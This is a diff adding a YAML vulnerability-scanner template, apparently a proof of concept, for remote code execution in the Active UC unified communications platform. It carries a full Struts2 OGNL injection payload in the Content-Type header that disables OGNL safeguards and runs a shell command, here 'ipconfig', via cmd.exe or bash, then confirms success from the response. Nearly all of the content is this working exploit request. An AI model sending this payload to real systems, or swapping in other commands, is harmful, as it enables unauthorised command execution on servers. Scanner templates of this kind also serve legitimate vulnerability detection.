@@ -1,0 +1,26 @@
+name: Active UC index.action RCE
+manual: true
+query: title="网动统一通信平台(Active UC)"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /acenter/index.action
+      headers:
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Accept-Encoding: gzip, deflate
+        Cache-Control: no-cache
+        Charsert: UTF-8
+        Connection: close
+        Content-Type: '%{(#nike=''multipart/form-data'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[''com.opensymphony.xwork2.ActionContext.container'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''ipconfig'').(#iswin=(@java.lang.System@getProperty(''os.name'').toLowerCase().contains(''win''))).(#cmds=(#iswin?{''cmd.exe'',''/c'',#cmd}:{''/bin/bash'',''-c'',#cmd})).(#p=new
+          java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())};
+          boundary=---------------------------18012721719170'
+        Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
+        Pragma: no-cache
+      body: "-----------------------------18012721719170\r\nContent-Disposition: form-data;
+        name=\"pocfile\"; filename=\"text.txt\"\r\nContent-Type: text/plain\r\n-----------------------------18012721719170"
+    expression: response.body.bcontains(b"Windows IP")
+expression: r0()
+detail:
+  tags: RCE
